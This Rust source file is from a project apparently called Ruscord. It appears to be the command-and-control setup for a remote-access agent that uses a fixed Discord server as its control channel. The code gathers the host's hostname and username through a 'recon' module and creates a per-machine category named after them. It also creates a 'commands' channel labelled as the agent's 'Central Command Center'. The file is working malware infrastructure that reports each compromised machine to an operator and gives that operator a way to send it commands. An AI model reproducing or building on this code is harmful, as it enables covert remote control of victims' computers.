use poise::serenity_prelude::{ChannelId, ChannelType, Context, CreateChannel, GuildChannel, GuildId};

use crate::{
	constants::RUSCORD_GUILD_ID,
	os::{traits::recon::ReconModule, OsModule},
	RuscordError,
};

pub const COMMAND_CHANNEL_NAME: &str = "commands";

pub struct AgentConfig {
	pub command_channel:  ChannelId,
	pub category_channel: ChannelId,
}

impl AgentConfig {
	fn category_channel_name() -> String {
		let os_module = OsModule::default();
		format!("{}:{}", os_module.hostname(), os_module.username())
	}

	/// Loads the config by looking up the category and command channels.
	///
	/// Returns an error if the category / command channels did not exist and could not be created.
	pub async fn load_config(ctx: &Context) -> Result<AgentConfig, RuscordError> {
		let guild = RUSCORD_GUILD_ID;
		let channels = guild.channels(&ctx.http).await?;

		let category_channel = match channels
			.values()
			.find(|v| v.name == Self::category_channel_name().as_str() && v.kind == ChannelType::Category)
		{
			Some(c) => c.clone(),
			None => Self::create_category_channel(ctx, &guild).await?,
		};

		let command_channel = match channels
			.values()
			.find(|v| v.name == COMMAND_CHANNEL_NAME && v.kind == ChannelType::Text && v.parent_id == Some(category_channel.id))
		{
			Some(c) => c.to_owned(),
			None => Self::create_command_channel(ctx, &guild, category_channel.id).await?,
		};

		Ok(AgentConfig {
			command_channel:  command_channel.id,
			category_channel: category_channel.id,
		})
	}

	/// Creates the category channel for the agent
	async fn create_category_channel(ctx: &Context, guild: &GuildId) -> Result<GuildChannel, RuscordError> {
		guild
			.create_channel(&ctx.http, CreateChannel::new(Self::category_channel_name()).kind(ChannelType::Category))
			.await
			.map_err(RuscordError::from)
	}

	/// Creates the command channel for the agent
	async fn create_command_channel(ctx: &Context, guild: &GuildId, parent_id: ChannelId) -> Result<GuildChannel, RuscordError> {
		guild
			.create_channel(
				&ctx.http,
				CreateChannel::new("commands")
					.kind(ChannelType::Text)
					.category(parent_id)
					.topic("Central Command Center for the Agent"),
			)
			.await
			.map_err(RuscordError::from)
	}

	// Getters
	pub fn command_channel(&self) -> ChannelId {
		self.command_channel
	}

	pub fn category_channel(&self) -> ChannelId {
		self.category_channel
	}

	/// Resets the command channel, useful for clearing messages.
	pub async fn reset_command_channel(&mut self, ctx: &Context) -> Result<(), RuscordError> {
		self.command_channel = Self::create_command_channel(ctx, &RUSCORD_GUILD_ID, self.category_channel).await?.into();
		Ok(())
	}
}
